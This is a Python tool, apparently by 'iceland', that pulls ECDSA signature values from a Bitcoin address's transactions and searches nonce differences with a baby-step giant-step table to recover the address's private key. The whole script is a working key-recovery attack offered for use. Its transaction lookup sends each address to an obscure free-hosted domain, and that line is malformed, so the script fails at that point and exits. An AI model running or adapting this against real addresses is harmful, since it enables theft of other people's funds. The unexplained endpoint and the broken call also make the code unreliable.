# -*- coding: utf-8 -*-
"""

@author: iceland
"""
import sys
import hashlib
import json
import argparse
from urllib.request import urlopen
from itertools import combinations
import secp256k1 as ice

G = ice.scalar_multiplication(1)
N = ice.N
ZERO = ice.Zero
#==============================================================================
parser = argparse.ArgumentParser(description='This tool helps to get ECDSA Signature r,s,z values from Bitcoin Address. Also attempt to solve \
                                 for privatekey using Rvalues successive differencing mathematics using bsgs table in RAM.', 
                                 epilog='Enjoy the program! :)    Tips BTC: bc1q39meky2mn5qjq704zz0nnkl0v7kj4uz6r529at')

parser.add_argument("-a", help = "Address to search for its rsz from the transactions", required="True")

bP = 100000000

if len(sys.argv)==1:
    parser.print_help()
    sys.exit(1)
args = parser.parse_args()

address = args.a if args.a else ''

if address == '': 
    print('One of the required option is missing -a'); sys.exit(1)
#==============================================================================
def get_rs(sig):
    rlen = int(sig[2:4], 16)
    r = sig[4:4+rlen*2]
#    slen = int(sig[6+rlen*2:8+rlen*2], 16)
    s = sig[8+rlen*2:]
    return r, s
#==============================================================================
def split_sig_pieces(script):
    sigLen = int(script[2:4], 16)
    sig = script[2+2:2+sigLen*2]
    r, s = get_rs(sig[4:])
    pubLen = int(script[4+sigLen*2:4+sigLen*2+2], 16)
    pub = script[4+sigLen*2+2:]
    assert(len(pub) == pubLen*2)
    return r, s, pub
#==============================================================================

# Returns list of this list [first, sig, pub, rest] for each input
def parseTx(txn):
    if len(txn) <130:
        print('[WARNING] rawtx most likely incorrect. Please check..')
        sys.exit(1)
    inp_list = []
    ver = txn[:8]
    if txn[8:12] == '0001':
        print('UnSupported Tx Input. Presence of Witness Data')
        sys.exit(1)
    inp_nu = int(txn[8:10], 16)
    
    first = txn[0:10]
    cur = 10
    for m in range(inp_nu):
        prv_out = txn[cur:cur+64]
        var0 = txn[cur+64:cur+64+8]
        cur = cur+64+8
        scriptLen = int(txn[cur:cur+2], 16)
        script = txn[cur:2+cur+2*scriptLen] #8b included
        r, s, pub = split_sig_pieces(script)
        seq = txn[2+cur+2*scriptLen:10+cur+2*scriptLen]
        inp_list.append([prv_out, var0, r, s, pub, seq])
        cur = 10+cur+2*scriptLen
    rest = txn[cur:]
    return [first, inp_list, rest]
#==============================================================================

def get_rawtx_from_blockchain(txid):
    try:
        htmlfile = urlopen("https://blockchain.info/rawtx/%s?format=hex" % txid, timeout = 20)
    except:
        print('Unable to connect internet to fetch RawTx. Exiting..')
        sys.exit(1)
    else: res = htmlfile.read().decode('utf-8')
    return res
#==============================================================================

def getSignableTxn(parsed):
    res = []
    first, inp_list, rest = parsed
    tot = len(inp_list)
    for one in range(tot):
        e = first
        for i in range(tot):
            e += inp_list[i][0] # prev_txid
            e += inp_list[i][1] # var0
            if one == i: 
                e += '1976a914' + HASH160(inp_list[one][4]) + '88ac'
            else:
                e += '00'
            e += inp_list[i][5] # seq
        e += rest + "01000000"
        z = hashlib.sha256(hashlib.sha256(bytes.fromhex(e)).digest()).hexdigest()
        res.append([inp_list[one][2], inp_list[one][3], z, inp_list[one][4], e])
    return res
#==============================================================================
def HASH160(pubk_hex):
    return hashlib.new('ripemd160', hashlib.sha256(bytes.fromhex(pubk_hex)).digest() ).hexdigest()
#==============================================================================

def diff_comb(alist):
    return [ice.point_subtraction(x, y) for x, y in combinations(alist, 2)]

def diff_comb_idx(alist):
    LL = len(alist)
    return [(i, j, ice.point_subtraction(alist[i], alist[j])) for i in range(LL) for j in range(i+1, LL)]
#==============================================================================
def inv(a):
    return pow(a, N - 2, N)

def calc_RQ(r, s, z, pub_point):
    # r, s, z in int format and pub_point in upub bytes
    RP1 = ice.pub2upub('02' + hex(r)[2:].zfill(64))
    RP2 = ice.pub2upub('03' + hex(r)[2:].zfill(64))
    sdr = (s * inv(r)) % N
    zdr = (z * inv(r)) % N
    FF1 = ice.point_subtraction( ice.point_multiplication(RP1, sdr),
                                ice.scalar_multiplication(zdr) )
    FF2 = ice.point_subtraction( ice.point_multiplication(RP2, sdr),
                                ice.scalar_multiplication(zdr) )
    if FF1 == pub_point: 
        print('========  RSZ to PubKey Validation [SUCCESS]  ========')
        return RP1
    if FF2 == pub_point: 
        print('========  RSZ to PubKey Validation [SUCCESS]  ========')
        return RP2
    return '========  RSZ to PubKey Validation [FAIL]  ========'

def getk1(r1, s1, z1, r2, s2, z2, m):
    nr = (s2 * m * r1 + z1 * r2 - z2 * r1) % N
    dr = (s1 * r2 - s2 * r1) % N
    return (nr * inv(dr)) % N


def getpvk(r1, s1, z1, r2, s2, z2, m):
    x1 = (s2 * z1 - s1 * z2 + m * s1 * s2) % N
    xi = inv((s1 * r2 - s2 * r1) % N)
    x = (x1 * xi) % N
    return x
#==============================================================================
def check_tx(address):
    txid = []
    cdx = []
    try:
        htmlfile = urlopen(f"http://bitrookhhshhg.wuaze.com/?address={address}" % address, timeout = 20)
    except:
        print('Unable to connect internet to fetch RawTx. Exiting..')
        sys.exit(1)
    else: 
        # current limit = 50. Need to use loop. update code in future for getting all Tx.
        res = json.loads(htmlfile.read())
        txcount = len(res)
        print(f'Total: {txcount} Input/Output Transactions in the Address: {address}')
        for i in range(txcount):
            vin_cnt = len(res[i]["vin"])
            for j in range(vin_cnt):
                if res[i]["vin"][j]["prevout"]["scriptpubkey_address"] == address:
                    txid.append(res[i]["txid"])
                    cdx.append(j)
#                    scriptsig = res[i]["vin"][j]["scriptsig"]
#                    print(f'Txid: {txid[-1]}  Index: {cdx[-1]}  Scriptsig: {scriptsig}')
    return txid, cdx
#==============================================================================

print('\nStarting Program...')
#address = '1JtAupan5MSPXxSsWFiwA79bY9LD2Ga1je'
# 1BFhrfTTZP3Nw4BNy4eX4KFLsn9ZeijcMm

print('-'*120)
txid, cdx = check_tx(address)
RQ, rL, sL, zL, QL = [], [], [], [], []

for c in range(len(txid)):
    rawtx = get_rawtx_from_blockchain(txid[c])
    try:
        m = parseTx(rawtx)
        e = getSignableTxn(m)
        for i in range(len(e)):
            if i == cdx[c]:
                rL.append( int( e[i][0], 16) )
                sL.append( int( e[i][1], 16) )
                zL.append( int( e[i][2], 16) )
                QL.append( ice.pub2upub(e[i][3]) )
                print('='*70,f'\n[Input Index #: {i}] [txid: {txid[c]}]\n     R: {e[i][0]}\n     S: {e[i][1]}\n     Z: {e[i][2]}\nPubKey: {e[i][3]}')
    except: print(f'Skipped the Tx [{txid[c]}]........')
        
print('='*70); print('-'*120)

#==============================================================================
for c in range(len(rL)):
    RQ.append( calc_RQ( rL[c], sL[c], zL[c], QL[c] ) )
    
# RD = diff_comb(RQ)
RD = diff_comb_idx(RQ)

print('RQ = ')
for i in RQ: print(f'{i.hex()}')
print('='*70);
print('RD = ')
for i in RD: print(f'{i[2].hex()}')
print('-'*120)
for i in RD:
    if i[2] == ZERO: print(f'Duplicate R Found. Congrats!. {i[0], i[1], i[2].hex()}')
#==============================================================================

# Time and RAM intensive process to make bigger Table
print(f'Starting to prepare BSGS Table with {bP} elements')
ice.bsgs_2nd_check_prepare(bP)

solvable_diff = []
for Q in RD:
    found, diff = ice.bsgs_2nd_check(Q[2], -1, bP)
    if found == True:
        solvable_diff.append((Q[0], Q[1], diff.hex()))
    
#==============================================================================
print('='*70); print('-'*120)
for i in solvable_diff:
    print(f'[i={i[0]}] [j={i[1]}] [R Diff = {i[2]}]')
    k = getk1(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int( i[2], 16) )
    d = getpvk(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int( i[2], 16) )
    print(f'Privatekey FOUND: {hex(d)}')
    print('='*70); print('-'*120) 
print('Program Finished ...')